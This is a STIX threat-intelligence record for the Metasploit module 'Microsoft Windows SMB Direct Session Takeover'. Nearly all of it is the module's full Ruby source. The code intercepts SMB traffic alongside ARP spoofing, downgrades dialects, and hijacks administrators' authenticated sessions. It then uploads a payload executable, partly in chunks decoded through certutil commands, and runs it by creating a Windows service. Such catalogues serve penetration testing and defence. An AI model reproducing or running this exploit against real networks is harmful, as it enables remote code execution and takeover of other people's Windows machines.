{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--05724ef3-49b3-42f3-abc4-8974213de940",
    "created": "2024-08-14T16:56:17.003823Z",
    "modified": "2024-08-14T16:56:17.003827Z",
    "name": "Microsoft Windows SMB Direct Session Takeover",
    "description": " This module will intercept direct SMB authentication requests to another host, gaining access to an authenticated SMB session if successful. If the connecting user is an administrator and network logins are allowed to the target machine, this module will execute an arbitrary payload. To exploit this, the target system must try to autheticate to another host on the local area network.  SMB Direct Session takeover is a combination of previous attacks.  This module is dependent on an external ARP spoofer. The builtin ARP spoofer was not providing sufficient host discovery. Bettercap v1.6.2 was used during the development of this module.  The original SMB relay attack was first reported by Sir Dystic on March 31st, 2001 at @lanta.con in Atlanta, Georgia. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/smb_shadow.rb",
            "external_id": "smb_shadow.rb"
        },
        {
            "source_name": "reference",
            "url": "https://strontium.io/blog/introducing-windows-10-smb-shadow-attack"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::Capture\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Windows SMB Direct Session Takeover',\n        'Description' => %q{\n          This module will intercept direct SMB authentication requests to\n          another host, gaining access to an authenticated SMB session if\n          successful. If the connecting user is an administrator and network\n          logins are allowed to the target machine, this module will execute an\n          arbitrary payload. To exploit this, the target system must try to\n          autheticate to another host on the local area network.\n\n          SMB Direct Session takeover is a combination of previous attacks.\n\n          This module is dependent on an external ARP spoofer. The builtin ARP\n          spoofer was not providing sufficient host discovery. Bettercap v1.6.2\n          was used during the development of this module.\n\n          The original SMB relay attack was first reported by Sir Dystic on March\n          31st, 2001 at @lanta.con in Atlanta, Georgia.\n        },\n        'Author' => [\n          'usiegl00'\n        ],\n        'License' => MSF_LICENSE,\n        'Privileged' => true,\n        'Payload' => {},\n        'References' => [\n          ['URL', 'https://strontium.io/blog/introducing-windows-10-smb-shadow-attack']\n        ],\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Platform' => 'win',\n        'Targets' => [\n          ['Automatic', {}]\n        ],\n        'DisclosureDate' => '2021-02-16',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ SERVICE_RESOURCE_LOSS ],\n          'Reliability' => [ UNRELIABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('SHARE', [true, 'The share to connect to', 'ADMIN$']),\n        OptString.new('INTERFACE', [true, 'The name of the interface']),\n        OptString.new('DefangedMode', [true, 'Run in defanged mode', true]),\n        OptString.new('DisableFwd', [true, 'Disable packet forwarding on port 445', true]),\n        OptBool.new('ConfirmServerDialect', [true, 'Confirm the server supports an SMB2 dialect.'])\n        # For future cross LAN work:\n        # OptString.new('GATEWAY',  [ true, \"The network gateway ip address\" ])\n      ]\n    )\n\n    deregister_options('SNAPLEN', 'FILTER', 'PCAPFILE', 'RHOST', 'SECRET', 'GATEWAY_PROBE_HOST', 'GATEWAY_PROBE_PORT',\n                       'TIMEOUT')\n  end\n\n  def exploit\n    @cleanup_mutex = Mutex.new\n    @cleanedup = true\n    if datastore['DefangedMode'].to_s == 'true'\n      warning = <<~EOF\n\n        Are you SURE you want to modify your port forwarding tables?\n        You MAY contaminate your current network configuration.\n\n        Disable the DefangedMode option if you wish to proceed.\n      EOF\n      fail_with(Failure::BadConfig, warning)\n    end\n    print_good('INFO : Warming up...')\n    print_error('WARNING : Not running as Root. This can cause socket permission issues.') unless Process.uid == 0\n    @sessions = []\n    @sessions_mutex = Mutex.new\n    @drop_packet_ip_port_map = {}\n    @drop_packet_ip_port_mutex = Mutex.new\n    @negotiated_dialect_map = {}\n    @negotiated_dialect_mutex = Mutex.new\n    @confirm_server_dialect = datastore['ConfirmServerDialect'] || false\n    @arp_cache = {}\n    @arp_mutex = Mutex.new\n    @main_threads = []\n    @interface = datastore['INTERFACE'] # || Pcap.lookupdev\n    unless Socket.getifaddrs.map(&:name).include? @interface\n      fail_with(Failure::BadConfig,\n                \"Interface not found: #{@interface}\")\n    end\n    @ip4 = ipv4_addresses[@interface]&.first\n    fail_with(Failure::BadConfig, \"Interface does not have address: #{@interface}\") unless @ip4&.count('.') == 3\n    @mac = get_mac(@interface)\n    fail_with(Failure::BadConfig, \"Interface does not have mac: #{@interface}\") unless @mac && @mac.instance_of?(String)\n    # For future cross LAN work: (Gateway is required.)\n    # @gateip4 = datastore['GATEWAY']\n    # fail_with(Failure::BadConfig, \"Invalid Gateway ip address: #{@gateip4}\") unless @gateip4&.count(\".\") == 3\n    # @gatemac = arp(tpa: @gateip4)\n    # fail_with(Failure::BadConfig, \"Unable to retrieve Gateway mac address: #{@gateip4}\") unless @gatemac && @gatemac.class == String\n    @share = datastore['SHARE']\n    print_status(\"Self: #{@ip4} | #{@mac}\")\n    # print_status(\"Gateway: #{@gateip4} | #{@gatemac}\")\n    disable_p445_fwrd\n    @cleanedup = false\n    start_syn_capture\n    start_ack_capture\n    start_rst_capture\n    print_status('INFO : This module must be run alongside an arp spoofer / poisoner.')\n    print_status('INFO : The arp spoofer used during the testing of this module is bettercap v1.6.2.')\n    main_capture\n  ensure\n    cleanup\n  end\n\n  # This prevents the TCP SYN on port 445 from passing through the filter.\n  # This allows us to have the time to modify the packets before forwarding them.\n  def disable_p445_fwrd\n    if datastore['DisableFwd'] == 'false'\n      print_status('DisableFwd was set to false.')\n      print_status('Packet forwarding on port 445 will not be disabled.')\n      return true\n    end\n    if RUBY_PLATFORM.include?('darwin')\n      pfctl = Rex::FileUtils.find_full_path('pfctl')\n      unless pfctl\n        fail_with(Failure::NotFound, 'The pfctl executable could not be found.')\n      end\n      IO.popen(\"#{pfctl} -a \\\"com.apple/shadow\\\" -f -\", 'r+', err: '/dev/null') do |pf|\n        pf.write(\"block out on #{@interface} proto tcp from any to any port 445\\n\")\n        pf.close_write\n      end\n      IO.popen(\"#{pfctl} -e\", err: '/dev/null').close\n    elsif RUBY_PLATFORM.include?('linux')\n      iptables = Rex::FileUtils.find_full_path('iptables')\n      unless iptables\n        fail_with(Failure::NotFound, 'The iptables executable could not be found.')\n      end\n      IO.popen(\"#{iptables} -A FORWARD -i #{@interface} -p tcp --destination-port 445 -j DROP\", err: '/dev/null').close\n    else\n      print_error(\"WARNING : Platform not supported: #{RUBY_PLATFORM}\")\n      print_error('WARNING : Packet forwarding on port 445 must be blocked manually.')\n      fail_with(Failure::BadConfig, 'Set DisableFwd to false after blocking port 445 manually.')\n    end\n    print_good('INFO : Packet forwarding on port 445 disabled.')\n    return true\n  end\n\n  # This reverts the changes made in disable_p445_fwrd\n  def reset_p445_fwrd\n    if datastore['DisableFwd'] == 'false'\n      print_status('DisableFwd was set to false.')\n      print_status('Packet forwarding on port 445 will not be reset.')\n      return true\n    end\n    if RUBY_PLATFORM.include?('darwin')\n      pfctl = Rex::FileUtils.find_full_path('pfctl')\n      unless pfctl\n        fail_with(Failure::NotFound, 'The pfctl executable could not be found.')\n      end\n      IO.popen(\"#{pfctl} -a \\\"com.apple/shadow\\\" -F rules\", err: '/dev/null').close\n    elsif RUBY_PLATFORM.include?('linux')\n      iptables = Rex::FileUtils.find_full_path('iptables')\n      unless iptables\n        fail_with(Failure::NotFound, 'The iptables executable could not be found.')\n      end\n      IO.popen(\"#{iptables} -D FORWARD -i #{@interface} -p tcp --destination-port 445 -j DROP\", err: '/dev/null').close\n    end\n    print_good('INFO : Packet forwarding on port 445 reset.')\n    return true\n  end\n\n  # This starts the SYN capture thread as part of step two.\n  def start_syn_capture\n    @syn_capture_thread = Rex::ThreadFactory.spawn('SynCaptureThread', false) do\n      c = PacketFu::Capture.new(iface: @interface, promisc: true)\n      c.capture\n      c.stream.setfilter(\"ether dst #{@mac} and not ether src #{@mac} and dst port 445 and tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0\")\n      c.stream.each_data do |data|\n        packet = PacketFu::Packet.parse(data)\n        next if @drop_packet_ip_port_map[packet.ip_header.ip_saddr + packet.tcp_header.tcp_src.to_s]\n\n        packet.eth_header.eth_src = Rex::Socket.eth_aton(@mac)\n        packet.eth_header.eth_dst = Rex::Socket.eth_aton(getarp(packet.ip_header.ip_daddr))\n        packet.to_w(@interface)\n      end\n    end\n  end\n\n  # This starts the ACK capture thread as part of step two.\n  def start_ack_capture\n    @ack_capture_thread = Rex::ThreadFactory.spawn('AckCaptureThread', false) do\n      c = PacketFu::Capture.new(iface: @interface, promisc: true)\n      c.capture\n      c.stream.setfilter(\"ether dst #{@mac} and not ether src #{@mac} and dst port 445 and tcp[tcpflags] & (tcp-syn) == 0 and tcp[tcpflags] & (tcp-ack) != 0 and tcp[((tcp[12] >> 4) * 4) + 4 : 4] != 0xfe534d42\")\n      c.stream.each_data do |data|\n        packet = PacketFu::Packet.parse(data)\n        next if @drop_packet_ip_port_map[packet.ip_header.ip_saddr + packet.tcp_header.tcp_src.to_s]\n\n        packet.eth_header.eth_src = Rex::Socket.eth_aton(@mac)\n        packet.eth_header.eth_dst = Rex::Socket.eth_aton(getarp(packet.ip_header.ip_daddr))\n        packet.to_w(@interface)\n      end\n    end\n  end\n\n  # This starts the ACK capture thread as part of step two.\n  def start_rst_capture\n    @rst_capture_thread = Rex::ThreadFactory.spawn('RstCaptureThread', false) do\n      c = PacketFu::Capture.new(iface: @interface, promisc: true)\n      c.capture\n      c.stream.setfilter(\"ether dst #{@mac} and not ether src #{@mac} and dst port 445 and tcp[tcpflags] & (tcp-syn) == 0 and tcp[tcpflags] & (tcp-rst) != 0\")\n      c.stream.each_data do |data|\n        packet = PacketFu::Packet.parse(data)\n        next if @drop_packet_ip_port_map[packet.ip_header.ip_saddr + packet.tcp_header.tcp_src.to_s]\n\n        packet.eth_header.eth_src = Rex::Socket.eth_aton(@mac)\n        packet.eth_header.eth_dst = Rex::Socket.eth_aton(getarp(packet.ip_header.ip_daddr))\n        packet.to_w(@interface)\n      end\n    end\n  end\n\n  # This returns a mac string by querying the arp cache by an ip address.\n  # If the address is not in the cache, it uses an arp query.\n  def getarp(ip4)\n    unless @arp_cache[ip4]\n      mac = arp(tpa: ip4)\n      @arp_mutex.synchronize { @arp_cache[ip4] = mac } unless mac == []\n    end\n    return @arp_cache[ip4]\n  end\n\n  # This sends an arp packet out to the network and captures the response.\n  # This allows us to resolve mac addresses in real time.\n  # We need the mac address of the server and client.\n  def arp(smac: @mac, dmac: 'ff:ff:ff:ff:ff:ff',\n          sha: @mac, spa: @ip4,\n          tha: '00:00:00:00:00:00', tpa: '', op: 1,\n          capture: true)\n    p = PacketFu::ARPPacket.new(\n      eth_src: Rex::Socket.eth_aton(smac),\n      eth_dst: Rex::Socket.eth_aton(dmac),\n      arp_src_mac: Rex::Socket.eth_aton(sha),\n      arp_src_ip: Rex::Socket.addr_aton(spa),\n      arp_dst_mac: Rex::Socket.eth_aton(tha),\n      arp_dst_ip: Rex::Socket.addr_aton(tpa),\n      arp_opcode: op\n    )\n    if capture\n      c = PacketFu::Capture.new(iface: @interface)\n      c.capture\n      c.stream.setfilter(\"arp src #{tpa} and ether dst #{smac}\")\n      p.to_w(@interface)\n      sleep 0.5\n      c.save\n      c.array.each do |pkt|\n        pkt = PacketFu::Packet.parse pkt\n        # This decodes the arp packet and returns the query response.\n        if pkt.arp_header.arp_src_ip == Rex::Socket.addr_aton(tpa)\n          return Rex::Socket.eth_ntoa(pkt.arp_header.arp_src_mac)\n        end\n        return Rex::Socket.addr_ntoa(pkt.arp_header.arp_src_ip) if Rex::Socket.eth_ntoa(pkt.arp_header.src_mac) == tha\n      end\n    else\n      p.to_w(@interface)\n    end\n  end\n\n  # This returns a hash of local interfaces and their ip addresses.\n  def ipv4_addresses\n    results = {}\n    Socket.getifaddrs.each do |iface|\n      if iface.addr.ipv4?\n        results[iface.name] = [] unless results[iface.name]\n        results[iface.name] << iface.addr.ip_address\n      end\n    end\n    results\n  end\n\n=begin For future cross LAN work: (Gateway is required.)\n  def ipv4_gateways\n    results = {}\n    Socket.getifaddrs.each do |iface|\n      if iface.addr.ipv4? & iface.netmask&.ipv4?\n        results[iface.name] = [] unless results[iface.name]\n        results[iface.name] << IPAddr.new(\n          IPAddr.new(iface.addr.ip_address).mask(iface.netmask.ip_address).to_i + 1,\n          IPAddr.new(iface.addr.ip_address).family\n        ).to_string\n      end\n    end\n    results\n  end\n=end\n\n  # This is the main capture thread that handles all SMB packets routed through this module.\n  def main_capture\n    # This makes sense in the context of the paper.\n    # Please read: https://strontium.io/blog/introducing-windows-10-smb-shadow-attack\n    mc = PacketFu::Capture.new(iface: @interface, promisc: true)\n    mc.capture\n    mc.stream.setfilter(\"ether dst #{@mac} and not ether src #{@mac} and dst port 445 and tcp[tcpflags] & (tcp-syn) == 0 and tcp[tcpflags] & (tcp-ack) != 0 and tcp[((tcp[12] >> 4) * 4) + 4 : 4] = 0xfe534d42\")\n    mc.stream.each_data do |data|\n      packet = PacketFu::Packet.parse(data)\n      nss = packet.payload[0..3]\n      smb2 = packet.payload[4..]\n      # Only Parse Packets from known sessions\n      if (smb2[0..4] != \"\\xFFSMB\") && !@sessions.include?(packet.ip_header.ip_daddr) && !@drop_packet_ip_port_map[packet.ip_header.ip_saddr + packet.tcp_header.tcp_src.to_s]\n        case smb2[11..12]\n        when \"\\x00\\x00\" # Negotiate Protocol Request\n          smb_packet = RubySMB::SMB2::Packet::NegotiateRequest.read(smb2)\n          # Dialect Count Set To 1\n          dialect = smb_packet.dialects.first\n          # TODO: We could negotiate different dialects between the server and client, but it would require a more interactive approach.\n          unless smb_packet.dialects.min >= 0x300\n            begin\n              if @negotiated_dialect_map[packet.tcp_header.tcp_src]\n                dialect = @negotiated_dialect_map[packet.tcp_header.tcp_src]\n              elsif @confirm_server_dialect\n                Timeout.timeout(2.75) do\n                  rport = packet.tcp_header.tcp_src - rand(42..83)\n                  @drop_packet_ip_port_mutex.synchronize do\n                    @drop_packet_ip_port_map[packet.ip_header.ip_saddr + rport.to_s] = true\n                  end\n                  dispatcher = Msf::Exploit::SMB::ShadowMitmDispatcher.new(\n                    interface: @interface,\n                    mac: @mac,\n                    eth_src: Rex::Socket.eth_aton(@mac),\n                    eth_dst: Rex::Socket.eth_aton(getarp(packet.ip_header.ip_daddr)),\n                    ip_src: Rex::Socket.addr_iton(packet.ip_header.ip_src),\n                    ip_dst: Rex::Socket.addr_iton(packet.ip_header.ip_dst),\n                    tcp_src: rport,\n                    tcp_dst: packet.tcp_header.tcp_dst,\n                    tcp_seq: rand(14540253..3736845241),\n                    tcp_ack: 0,\n                    tcp_win: packet.tcp_header.tcp_win\n                  )\n                  dispatcher.send_packet(\n                    '',\n                    nbss_header: false,\n                    tcp_flags: { syn: 1 },\n                    tcp_opts: PacketFu::TcpOptions.new.encode(\"MSS:#{Msf::Exploit::SMB::ShadowMitmDispatcher::TCP_MSS}\").to_s\n                  )\n                  dispatcher.recv_packet\n                  dispatcher.send_packet(\n                    '',\n                    nbss_header: false,\n                    tcp_flags: { ack: 1 }\n                  )\n                  client = RubySMB::Client.new(dispatcher, smb1: true, smb2: true, smb3: false, username: '', password: '')\n                  client.negotiate\n                  dialect = client.dialect.to_i(16)\n                  # pp dialect\n                  @drop_packet_ip_port_mutex.synchronize do\n                    @drop_packet_ip_port_map[packet.ip_header.ip_saddr + rport.to_s] = false\n                  end\n                  @negotiated_dialect_mutex.synchronize do\n                    @negotiated_dialect_map[packet.tcp_header.tcp_src] = dialect\n                  end\n                end\n              # Check if the server supports any SMB2 dialects\n              else\n                # We just assume the server supports the client's minimum dialect.\n                dialect = smb_packet.dialects.min\n                @negotiated_dialect_mutex.synchronize do\n                  @negotiated_dialect_map[packet.tcp_header.tcp_src] = dialect\n                end\n              end\n              unless dialect >= 0x300\n                original_size = smb_packet.to_binary_s.size\n                smb_packet.dialects = [dialect]\n                smb_packet.negotiate_context_list = []\n                smb_packet.client_start_time = 0\n                # Re-Calculate Length: (Optional...)\n                # nss = [smb_packet.to_binary_s.size].pack(\"N\")\n                # Add more dialects while keeping the dialect count at one to pad out the message.\n                ((original_size - smb_packet.to_binary_s.size) / 2).times { |_i| smb_packet.dialects << dialect }\n                smb_packet.dialect_count = 1\n                packet.payload = \"#{nss}#{smb_packet.to_binary_s}\"\n                packet.recalc\n              end\n            rescue Timeout::Error, Errno::ECONNREFUSED, RubySMB::Error::CommunicationError, RubySMB::Error::NegotiationFailure => e\n              # We were unable to connect to the server or we were unable to negotiate any SMB2 dialects\n              print_status(\"Confirm Server Dialect Error: #{e}\")\n            end\n          end\n        when \"\\x00\\x01\" # Session Setup Request, NTLMSSP_AUTH\n          smb_packet = RubySMB::SMB2::Packet::SessionSetupRequest.read(smb2)\n          if (smb_packet.smb2_header.session_id != 0) && (@negotiated_dialect_map[packet.tcp_header.tcp_src] && @negotiated_dialect_map[packet.tcp_header.tcp_src] < 0x300)\n            # Disable Session\n            @drop_packet_ip_port_mutex.synchronize do\n              @drop_packet_ip_port_map[packet.ip_header.ip_saddr + packet.tcp_header.tcp_src.to_s] = true\n            end\n            # Start Main Thread\n            @main_threads << Rex::ThreadFactory.spawn(\"MainThread#{packet.tcp_header.tcp_src}\", false) do\n              main_thread(packet: packet, dialect: @negotiated_dialect_map[packet.tcp_header.tcp_src], dstmac: getarp(packet.ip_header.ip_daddr))\n            end\n          end\n        when \"\\x00\\x03\" # Tree Connect Request\n          smb_packet = RubySMB::SMB2::Packet::TreeConnectRequest.read(smb2)\n          # We assume that if we didn't intercept the SessionSetupRequest, the client must be using SMBv3.\n          # SMBv3 requires signing on all TreeConnectRequests.\n          # As we do not have access to the client's session key, we must perform the attack without connecting to a different tree.\n          # The only tree that we are able to do this with is the IPC$ tree, as it has control over the svcctl service controller.\n          if smb_packet.path.include?('\\\\IPC$'.encode('UTF-16LE')) && (@negotiated_dialect_map[packet.tcp_header.tcp_src].nil? || @negotiated_dialect_map[packet.tcp_header.tcp_src] >= 0x300)\n            # Disable Session\n            @drop_packet_ip_port_mutex.synchronize do\n              @drop_packet_ip_port_map[packet.ip_header.ip_saddr + packet.tcp_header.tcp_src.to_s] = true\n            end\n            # Start Main Thread\n            @main_threads << Rex::ThreadFactory.spawn(\"MainThread#{packet.tcp_header.tcp_src}\", false) do\n              # At this point, any SMBv3 version will do in order to conduct the attack.\n              # Their minor protocol differences should not be relevant in this situation.\n              # I just assumed that 0x300 is the least secure, which should be the right one to choose.\n              main_thread(packet: packet, dialect: 0x300, dstmac: getarp(packet.ip_header.ip_daddr))\n            end\n          end\n        end\n      end\n      next if @drop_packet_ip_port_map[packet.ip_header.ip_saddr + packet.tcp_header.tcp_src.to_s]\n\n      packet.eth_header.eth_src = Rex::Socket.eth_aton(@mac)\n      packet.eth_header.eth_dst = Rex::Socket.eth_aton(getarp(packet.ip_header.ip_daddr))\n      # packet.recalc\n      packet.to_w(@interface)\n    end\n  end\n\n  # This handles a session that has already authenticated to the server.\n  # This allows us to offload the session from the main capture thead.\n  def main_thread(packet:, dialect:, dstmac:)\n    dispatcher = Msf::Exploit::SMB::ShadowMitmDispatcher.new(\n      interface: @interface,\n      mac: @mac,\n      eth_src: Rex::Socket.eth_aton(@mac),\n      eth_dst: Rex::Socket.eth_aton(dstmac),\n      ip_src: Rex::Socket.addr_iton(packet.ip_header.ip_src),\n      ip_dst: Rex::Socket.addr_iton(packet.ip_header.ip_dst),\n      tcp_src: packet.tcp_header.tcp_src,\n      tcp_dst: packet.tcp_header.tcp_dst,\n      tcp_seq: packet.tcp_header.tcp_seq,\n      tcp_ack: packet.tcp_header.tcp_ack,\n      tcp_win: packet.tcp_header.tcp_win\n    )\n    dispatcher.send_packet(packet.payload, nbss_header: false)\n    data = dispatcher.recv_packet\n    if dialect >= 0x300\n      smb_packet = RubySMB::SMB2::Packet::TreeConnectResponse.read(data)\n    else\n      smb_packet = RubySMB::SMB2::Packet::SessionSetupResponse.read(data)\n    end\n\n    address = packet.ip_header.ip_daddr\n\n    smb1 = dialect / 0x100 == 1\n    smb2 = dialect / 0x100 == 2\n    smb3 = dialect / 0x100 == 3\n    client = RubySMB::Client.new(dispatcher, smb1: smb1, smb2: smb2, smb3: smb3, always_encrypt: false, username: '', password: '')\n\n    client.dialect = dialect\n    client.session_id = smb_packet.smb2_header.session_id\n    client.smb2_message_id = smb_packet.smb2_header.message_id + 1\n    client.negotiated_smb_version = dialect\n\n    # SMB3 requires signing on the TreeConnectRequest\n    # We are unable to sign the request, as we do not have the session key.\n    # This means that we have to stay on the same tree during the entire attack.\n    # We can perform the entire attack from the IPC$ tree, at the cost of reduced speed.\n    # Using this separated delivery technique, we can conduct the attack without disconnecting from the tree.\n    if dialect >= 0x300\n      tree = RubySMB::SMB2::Tree.new(client: client, share: \"\\\\\\\\#{address}\\\\IPC$\", response: smb_packet, encrypt: false)\n\n      print_status('Connecting to the Service Control Manager...')\n      svcctl = tree.open_file(filename: 'svcctl', write: true, read: true)\n      svcctl.bind(endpoint: RubySMB::Dcerpc::Svcctl)\n      scm_handle = svcctl.open_sc_manager_w(address)\n      print_status('Regenerating the payload...')\n\n      filename = rand_text_alpha(8) + '.exe'\n      servicename = rand_text_alpha(8)\n      opts = { servicename: servicename }\n      exe = generate_payload_exe_service(opts)\n      print_status('Uploading payload...')\n      mindex = [exe].pack('m0').bytes.each_slice(1024).to_a.size\n      [exe].pack('m0').bytes.each_slice(1024).to_a.each_with_index do |part, index|\n        partfile = \"%SYSTEMROOT%\\\\#{rand_text_alpha(8)}\"\n        print_status(\"Uploading payload: #{index + 1}/#{mindex}\")\n        launch_service(\n          svcctl: svcctl,\n          scm_handle: scm_handle,\n          service: \"%COMSPEC% /c echo #{part.pack('C*')} > #{partfile}.b64 & certutil -decodehex #{partfile}.b64 #{partfile} 0x400000001 & type #{partfile} #{(index == 0) ? '>' : '>>'} %SYSTEMROOT%\\\\#{filename} & del #{partfile} #{partfile}.b64\",\n          log: false\n        )\n      end\n      sleep 3\n      print_status(\"Created \\\\#{filename}...\")\n    else\n      print_status('Connecting to the defined share...')\n      path = \"\\\\\\\\#{address}\\\\#{@share}\"\n      tree = client.tree_connect(path)\n\n      print_status('Regenerating the payload...')\n      filename = rand_text_alpha(8) + '.exe'\n      servicename = rand_text_alpha(8)\n      opts = { servicename: servicename }\n      exe = generate_payload_exe_service(opts)\n\n      print_status('Uploading payload...')\n      file = tree.open_file(filename: filename, write: true, disposition: RubySMB::Dispositions::FILE_SUPERSEDE)\n      # The MITM dispatcher supports tcp packet fragmentation.\n      file.write(data: exe)\n\n      print_status(\"Created \\\\#{filename}...\")\n      file.close\n      tree.disconnect!\n\n      print_status('Connecting to the Service Control Manager...')\n      ipc_path = \"\\\\\\\\#{address}\\\\IPC$\"\n      tree = client.tree_connect(ipc_path)\n      svcctl = tree.open_file(filename: 'svcctl', write: true, read: true)\n      svcctl.bind(endpoint: RubySMB::Dcerpc::Svcctl)\n      scm_handle = svcctl.open_sc_manager_w(address)\n    end\n\n    launch_service(\n      svcctl: svcctl,\n      scm_handle: scm_handle,\n      service: \"%SYSTEMROOT%\\\\#{filename}\"\n    )\n\n    @sessions_mutex.synchronize { @sessions << address }\n    sleep 0.5\n\n    # Due to our inability to sign TreeConnectRequests when using SMBv3, we must stay on the same tree.\n    # The IPC$ tree has access to the svcctl service launcher.\n    # We can delete the file by scheduling a command as a service to do so.\n    if dialect >= 0x300\n      print_status(\"Deleting \\\\#{filename}...\")\n      launch_service(\n        svcctl: svcctl,\n        scm_handle: scm_handle,\n        service: \"%COMSPEC% /c del %SYSTEMROOT%\\\\#{filename}\",\n        log: false\n      )\n\n      print_status('Closing service handle...')\n      svcctl.close_service_handle(scm_handle)\n    else\n      print_status('Closing service handle...')\n      svcctl.close_service_handle(scm_handle)\n      tree.disconnect!\n\n      print_status(\"Deleting \\\\#{filename}...\")\n      tree = client.tree_connect(path)\n      file = tree.open_file(filename: filename, delete: true)\n      file.delete\n    end\n\n=begin\n    # Prevent STATUS_USER_SESSION_DELETED\n    #sleep 42 <- We must use traffic to prevent the server from closing the connection\n    20.times do\n      sleep 2\n      begin\n        tree.open_file(filename: '.', read: false)\n      rescue RubySMB::Error::UnexpectedStatusCode\n        # Expected STATUS_ACCESS_DENIED\n      end\n    end\n=end\n\n    tree.disconnect!\n\n    client.disconnect!\n    return true # Done.\n  end\n\n  # Launch a svcctl service by creating, starting, and then deleting it\n  def launch_service(svcctl:, scm_handle:, service:, log: true)\n    service_name = rand_text_alpha(8)\n    display_name = rand_text_alpha(rand(8..32))\n\n    print_status('Creating a new service...') if log\n    svc_handle = svcctl.create_service_w(scm_handle, service_name, display_name, service)\n\n    print_status('Closing service handle...') if log\n    svcctl.close_service_handle(svc_handle)\n    svc_handle = svcctl.open_service_w(scm_handle, service_name)\n\n    print_status('Starting the service...') if log\n    begin\n      svcctl.start_service_w(svc_handle)\n    rescue RubySMB::Dcerpc::Error::SvcctlError\n      # StartServiceW returns an error on success.\n    end\n\n    sleep 0.1\n\n    print_status('Removing the service...') if log\n    svcctl.delete_service(svc_handle)\n    return true\n  end\n\n  # This cleans up and exits all the active threads.\n  def cleanup\n    @cleanup_mutex.synchronize do\n      unless @cleanedup\n        print_status 'Cleaning Up...'\n        @syn_capture_thread.exit if @syn_capture_thread\n        @ack_capture_thread.exit if @ack_capture_thread\n        @rst_capture_thread.exit if @rst_capture_thread\n        @main_threads.map(&:exit) if @main_threads\n        reset_p445_fwrd\n        @cleanedup = true\n        print_status 'Cleaned Up.'\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-02-16",
    "x_mitre_platforms": [
        "win'"
    ]
}